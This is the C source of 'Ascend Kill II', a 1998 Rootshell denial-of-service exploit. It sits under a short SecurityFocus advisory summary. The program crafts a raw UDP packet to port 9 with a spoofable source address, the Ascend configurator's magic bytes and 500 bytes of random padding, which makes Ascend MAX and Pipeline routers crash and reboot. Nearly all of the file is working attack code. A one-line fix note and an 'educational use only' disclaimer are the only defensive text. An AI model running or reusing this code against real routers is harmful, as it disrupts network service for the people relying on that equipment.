/*
source: http://www.securityfocus.com/bid/714/info

Certain versions of Ascends (Lucent) router software listen on port 9 (UDP Discard). Ascend provides configuration tools for MAX and Pipeline routers that locate locally installed routers by broadcasting a specially formatted packet to UDP port 9. An attacker can send a similar but malformed packet to the same port that will cause MAX and Pipeline routers running certain software versions to crash. 
*/

/* Update, 3/20/98: Ascend has released 5.0Ap46 which corrects this bug.
 * see ftp.ascend.com.
 */
 
/*
 * Ascend Kill II - C version
 *
 * (C) 1998 Rootshell - http://www.rootshell.com/
 *
 * Released: 3/16/98
 *
 * Thanks to Secure Networks.  See SNI-26: Ascend Router Security Issues
 * (http://www.secnet.com/sni-advisories/sni-26.ascendrouter.advisory.html)
 *
 * Sends a specially constructed UDP packet on the discard port (9)
 * which cause Ascend routers to reboot.  (Warning! Ascend routers will
 * process these if they are broadcast packets.)
 *
 * Compiled under RedHat 5.0 with glibc.
 *
 * NOTE: This program is NOT to be used for malicous purposes.  This is
 *       intenteded for educational purposes only.  By using this program
 *       you agree to use this for lawfull purposes ONLY.
 *
 * It is worth mentioning that Ascend has known about this bug for quite
 * some time.
 *
 * Fix:
 *
 * Filter inbound UDP on port 9.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <linux/udp.h>
#include <netdb.h>

#define err(x) { fprintf(stderr, x); exit(1); }
#define errs(x, y) { fprintf(stderr, x, y); exit(1); }

/* This magic packet was taken from the Java Configurator */
char ascend_data[] =
  {
    0x00, 0x00, 0x07, 0xa2, 0x08, 0x12, 0xcc, 0xfd, 0xa4, 0x81, 0x00, 0x00,
    0x00, 0x00, 0x12, 0x34, 0x56, 0x78, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0x00, 0x4e, 0x41, 0x4d, 0x45, 0x4e, 0x41, 0x4d, 0x45, 0x4e,
    0x41, 0x4d, 0x45, 0x4e, 0x41, 0x4d, 0x45, 0xff, 0x50, 0x41, 0x53, 0x53,
    0x57, 0x4f, 0x52, 0x44, 0x50, 0x41, 0x53, 0x53, 0x57, 0x4f, 0x52, 0x44,
    0x50, 0x41, 0x53, 0x53};


unsigned short 
in_cksum (addr, len)
     u_short *addr;
     int len;
{
  register int nleft = len;
  register u_short *w = addr;
  register int sum = 0;
  u_short answer = 0;

  while (nleft > 1)
    {
      sum += *w++;
      nleft -= 2;
    }
  if (nleft == 1)
    {
      *(u_char *) (&answer) = *(u_char *) w;
      sum += answer;
    }

  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return (answer);
}

int 
sendpkt_udp (sin, s, data, datalen, saddr, daddr, sport, dport)
     struct sockaddr_in *sin;
     unsigned short int s, datalen, sport, dport;
     unsigned long int saddr, daddr;
     char *data;
{
  struct iphdr ip;
  struct udphdr udp;
  static char packet[8192];
  char crashme[500];
  int i;

  ip.ihl = 5;
  ip.version = 4;
  ip.tos = rand () % 100;;
  ip.tot_len = htons (28 + datalen);
  ip.id = htons (31337 + (rand () % 100));
  ip.frag_off = 0;
  ip.ttl = 255;
  ip.protocol = IPPROTO_UDP;
  ip.check = 0;
  ip.saddr = saddr;
  ip.daddr = daddr;
  ip.check = in_cksum ((char *) &ip, sizeof (ip));
  udp.source = htons (sport);
  udp.dest = htons (dport);
  udp.len = htons (8 + datalen);
  udp.check = (short) 0;
  memcpy (packet, (char *) &ip, sizeof (ip));
  memcpy (packet + sizeof (ip), (char *) &udp, sizeof (udp));
  memcpy (packet + sizeof (ip) + sizeof (udp), (char *) data, datalen);
  /* Append random garbage to the packet, without this the router
     will think this is a valid probe packet and reply. */
  for (i = 0; i < 500; i++)
    crashme[i] = rand () % 255;
  memcpy (packet + sizeof (ip) + sizeof (udp) + datalen, crashme, 500);
  return (sendto (s, packet, sizeof (ip) + sizeof (udp) + datalen + 500, 0,
                  (struct sockaddr *) sin, sizeof (struct sockaddr_in)));
}

unsigned int 
lookup (host)
     char *host;
{
  unsigned int addr;
  struct hostent *he;

  addr = inet_addr (host);
  if (addr == -1)
    {
      he = gethostbyname (host);
      if ((he == NULL) || (he->h_name == NULL) || (he->h_addr_list == NULL))
        return 0;

      bcopy (*(he->h_addr_list), &(addr), sizeof (he->h_addr_list));
    }
  return (addr);
}

void
main (argc, argv)
     int argc;
     char **argv;
{
  unsigned int saddr, daddr;
  struct sockaddr_in sin;
  int s, i;

  if (argc != 3)
    errs ("Usage: %s <source_addr> <dest_addr>\n", argv[0]);

  if ((s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
    err ("Unable to open raw socket.\n");
  if (!(saddr = lookup (argv[1])))
    err ("Unable to lookup source address.\n");
  if (!(daddr = lookup (argv[2])))
    err ("Unable to lookup destination address.\n");
  sin.sin_family = AF_INET;
  sin.sin_port = 9;
  sin.sin_addr.s_addr = daddr;
  if ((sendpkt_udp (&sin, s, &ascend_data, sizeof (ascend_data), saddr, daddr, 9, 9)) == -1)
    {
      perror ("sendpkt_udp");
      err ("Error sending the UDP packet.\n");
    }
}